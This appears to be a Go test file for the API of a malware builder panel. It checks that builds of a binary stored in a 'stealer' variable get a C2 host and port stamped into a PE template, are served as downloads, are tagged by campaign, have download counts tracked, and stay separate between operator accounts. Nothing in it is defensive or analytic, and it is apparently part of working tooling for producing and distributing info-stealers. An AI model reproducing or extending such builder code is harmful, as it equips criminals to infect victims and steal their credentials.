package api_test

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"zialfi-panel/internal/api"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/services"
)

func makeTestPE(t *testing.T) []byte {
	t.Helper()
	buf := make([]byte, 0, 4096)
	buf = append(buf, []byte("MZ")...)
	buf = append(buf, make([]byte, 62)...)
	buf = append(buf, []byte("PE\x00\x00")...)

	coff := make([]byte, 20)
	coff[0] = 0x64
	coff[1] = 0x86
	coff[2] = 2
	coff[16] = 0xF0
	coff[17] = 0x01
	buf = append(buf, coff...)

	optHeader := make([]byte, 0x1F0)
	optHeader[0] = 0x0B
	optHeader[1] = 0x02
	optHeader[32] = 0x00
	optHeader[33] = 0x10
	optHeader[36] = 0x00
	optHeader[37] = 0x02
	buf = append(buf, optHeader...)

	for len(buf) < 0x400 {
		buf = append(buf, 0)
	}

	copy(buf, []byte("MIRAGECFG"))

	for len(buf) < 0x400+512 {
		buf = append(buf, 0)
	}

	return buf
}

func setupBuildHandler(t *testing.T) (*api.BuildHandler, *sql.DB) {
	t.Helper()
	d := openTestDB(t)
	svc := services.NewBuildService()
	stealer := makeTestPE(t)
	handler := api.NewBuildHandler(svc, stealer, nil, d, db.ProviderSQLite)
	return handler, d
}

func TestBuild_CreateAndList(t *testing.T) {
	handler, d := setupBuildHandler(t)

	body := `{"c2_host":"192.168.1.1","c2_port":4444,"build_tag":"release-1"}`
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	handler.Build(w, req)

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["id"] == "" {
		t.Error("expected non-empty build id")
	}
	if resp["sha256"] == "" {
		t.Error("expected non-empty sha256")
	}
	if resp["build_tag"] != "release-1" {
		t.Errorf("build_tag = %v, want %q", resp["build_tag"], "release-1")
	}

	reqList := httptest.NewRequest(http.MethodGet, "/api/build", nil)
	wList := httptest.NewRecorder()
	handler.List(wList, reqList)

	if wList.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", wList.Code, wList.Body.String())
	}

	var builds []map[string]any
	if err := json.Unmarshal(wList.Body.Bytes(), &builds); err != nil {
		t.Fatal(err)
	}
	if len(builds) != 1 {
		t.Fatalf("expected 1 build, got %d", len(builds))
	}
	if builds[0]["build_tag"] != "release-1" {
		t.Errorf("expected build_tag release-1, got %v", builds[0]["build_tag"])
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM builds").Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 build in DB, got %d", count)
	}
}

func TestBuild_Download(t *testing.T) {
	handler, d := setupBuildHandler(t)

	body := `{"c2_host":"10.0.0.1","c2_port":8080}`
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	handler.Build(w, req)

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	buildID := resp["id"].(string)

	r := chi.NewRouter()
	r.Get("/api/build/{id}/download", handler.Download)

	reqDL := httptest.NewRequest(http.MethodGet, fmt.Sprintf("/api/build/%s/download", buildID), nil)
	wDL := httptest.NewRecorder()
	r.ServeHTTP(wDL, reqDL)

	if wDL.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", wDL.Code, wDL.Body.String())
	}

	ct := wDL.Header().Get("Content-Type")
	if ct != "application/octet-stream" {
		t.Errorf("Content-Type = %q, want %q", ct, "application/octet-stream")
	}

	disposition := wDL.Header().Get("Content-Disposition")
	if !strings.Contains(disposition, "attachment") {
		t.Errorf("Content-Disposition = %q, want attachment", disposition)
	}

	data, _ := io.ReadAll(wDL.Body)
	if len(data) == 0 {
		t.Error("expected non-empty file data")
	}

	var downloadCount int
	d.QueryRow("SELECT download_count FROM builds WHERE id = ?", buildID).Scan(&downloadCount)
	if downloadCount != 1 {
		t.Errorf("expected download_count=1, got %d", downloadCount)
	}
}

func TestBuild_MissingRequiredFields(t *testing.T) {
	handler, _ := setupBuildHandler(t)

	tests := []struct {
		name string
		body string
	}{
		{"missing all fields", `{}`},
		{"missing c2_host", `{"c2_port":4444}`},
		{"missing c2_port", `{"c2_host":"1.2.3.4"}`},
		{"empty c2_host", `{"c2_host":"","c2_port":4444}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(tt.body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			handler.Build(w, req)

			if w.Code != http.StatusBadRequest {
				t.Errorf("expected 400, got %d: %s", w.Code, w.Body.String())
			}
		})
	}
}

func TestBuild_DownloadNotFound(t *testing.T) {
	handler, _ := setupBuildHandler(t)

	r := chi.NewRouter()
	r.Get("/api/build/{id}/download", handler.Download)

	req := httptest.NewRequest(http.MethodGet, "/api/build/nonexistent-id/download", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d: %s", w.Code, w.Body.String())
	}
}

func TestBuild_ListEmpty(t *testing.T) {
	handler, _ := setupBuildHandler(t)

	req := httptest.NewRequest(http.MethodGet, "/api/build", nil)
	w := httptest.NewRecorder()
	handler.List(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var builds []any
	if err := json.Unmarshal(w.Body.Bytes(), &builds); err != nil {
		t.Fatal(err)
	}
	if len(builds) != 0 {
		t.Errorf("expected empty list, got %d items", len(builds))
	}
}

func TestBuild_UpdateTag(t *testing.T) {
	handler, d := setupBuildHandler(t)

	body := `{"c2_host":"10.0.0.1","c2_port":8080,"build_tag":"original"}`
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	handler.Build(w, req)

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	buildID := resp["id"].(string)

	updateBody := `{"tag":"updated-campaign"}`
	r := chi.NewRouter()
	r.Put("/api/build/{id}/tag", handler.UpdateTag)
	updateReq := httptest.NewRequest(http.MethodPut, "/api/build/"+buildID+"/tag", strings.NewReader(updateBody))
	updateReq.Header.Set("Content-Type", "application/json")
	updateW := httptest.NewRecorder()
	r.ServeHTTP(updateW, updateReq)

	if updateW.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", updateW.Code, updateW.Body.String())
	}

	var tag string
	d.QueryRow("SELECT build_tag FROM builds WHERE id = ?", buildID).Scan(&tag)
	if tag != "updated-campaign" {
		t.Errorf("build_tag = %q, want %q", tag, "updated-campaign")
	}
}

func TestBuild_Stats(t *testing.T) {
	handler, d := setupBuildHandler(t)

	body := `{"c2_host":"10.0.0.1","c2_port":8080,"build_tag":"stats-test"}`
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	handler.Build(w, req)

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	buildID := resp["id"].(string)

	d.Exec("UPDATE builds SET download_count = 5 WHERE id = ?", buildID)

	statsReq := httptest.NewRequest(http.MethodGet, "/api/build/stats", nil)
	statsW := httptest.NewRecorder()
	handler.Stats(statsW, statsReq)

	if statsW.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", statsW.Code, statsW.Body.String())
	}

	var statsResp map[string]any
	json.Unmarshal(statsW.Body.Bytes(), &statsResp)

	totalDownloads := int(statsResp["total_downloads"].(float64))
	if totalDownloads != 5 {
		t.Errorf("total_downloads = %d, want 5", totalDownloads)
	}
}

func TestBuild_ListByTag(t *testing.T) {
	handler, _ := setupBuildHandler(t)

	body1 := `{"c2_host":"10.0.0.1","c2_port":8080,"build_tag":"campaign-a"}`
	req1 := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body1))
	req1.Header.Set("Content-Type", "application/json")
	w1 := httptest.NewRecorder()
	handler.Build(w1, req1)
	if w1.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d", w1.Code)
	}

	body2 := `{"c2_host":"10.0.0.2","c2_port":9090,"build_tag":"campaign-b"}`
	req2 := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body2))
	req2.Header.Set("Content-Type", "application/json")
	w2 := httptest.NewRecorder()
	handler.Build(w2, req2)
	if w2.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d", w2.Code)
	}

	listReq := httptest.NewRequest(http.MethodGet, "/api/build?tag=campaign-a", nil)
	listW := httptest.NewRecorder()
	handler.List(listW, listReq)

	if listW.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", listW.Code)
	}

	var builds []map[string]any
	json.Unmarshal(listW.Body.Bytes(), &builds)

	if len(builds) != 1 {
		t.Fatalf("expected 1 build, got %d", len(builds))
	}
	if builds[0]["build_tag"] != "campaign-a" {
		t.Errorf("build_tag = %v, want campaign-a", builds[0]["build_tag"])
	}
}


func insertBuildWithUser(t *testing.T, d *sql.DB, userID string) string {
	t.Helper()
	buildID := uuid.New().String()
	_, err := d.Exec(`INSERT INTO builds (id, config_hash, file_size, file_data, sha256, build_tag, module_config, user_id)
		VALUES (?, 'hash', 4, x'01020304', 'sha', 'tag', '{}', ?)`, buildID, userID)
	if err != nil {
		t.Fatal(err)
	}
	return buildID
}

func TestBuildList_OwnerIsolation(t *testing.T) {
	d := openTestDB(t)
	r := chi.NewRouter()
	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)

	tokenA, userA := workerToken(t, d, "builda")
	tokenB, userB := workerToken(t, d, "buildb")

	buildA := insertBuildWithUser(t, d, userA)
	buildB := insertBuildWithUser(t, d, userB)

	for _, tc := range []struct {
		token    string
		wantID   string
	}{
		{tokenA, buildA},
		{tokenB, buildB},
	} {
		req := httptest.NewRequest(http.MethodGet, "/api/build", nil)
		req.Header.Set("Authorization", "Bearer "+tc.token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
		}
		var builds []map[string]any
		if err := json.Unmarshal(w.Body.Bytes(), &builds); err != nil {
			t.Fatal(err)
		}
		if len(builds) != 1 {
			t.Fatalf("expected 1 build, got %d", len(builds))
		}
		if builds[0]["id"] != tc.wantID {
			t.Errorf("expected build %s, got %v", tc.wantID, builds[0]["id"])
		}
	}
}

func TestBuildDownload_OwnerForbidden(t *testing.T) {
	d := openTestDB(t)
	r := chi.NewRouter()
	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)

	_, userA := workerToken(t, d, "builda")
	tokenB, _ := workerToken(t, d, "buildb")

	buildA := insertBuildWithUser(t, d, userA)

	req := httptest.NewRequest(http.MethodGet, "/api/build/"+buildA+"/download", nil)
	req.Header.Set("Authorization", "Bearer "+tokenB)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
}
